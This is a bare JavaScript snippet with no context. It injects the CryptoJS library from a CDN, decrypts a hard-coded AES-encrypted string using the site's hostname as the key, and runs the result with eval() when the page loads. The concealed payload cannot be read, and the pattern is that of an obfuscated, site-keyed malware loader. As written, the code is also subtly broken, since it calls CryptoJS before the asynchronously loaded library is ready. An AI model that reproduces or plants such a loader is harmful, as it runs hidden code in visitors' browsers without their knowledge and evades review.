function loader(){
  script=document.createElement('script');
  script.src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js";
  document.getElementsByTagName('head')[0].appendChild(script);
  key = window.location.host;
  encrypted = "U2FsdGVkX1+iaLwrl3/X3+kZxqrP7PmIYqmdf6Er+VYgvPWMJN1CrJmWKyELs2YE";
  decrypted = CryptoJS.AES.decrypt(encrypted, key);
  eval(decrypted.toString(CryptoJS.enc.Utf8));
}
loader();
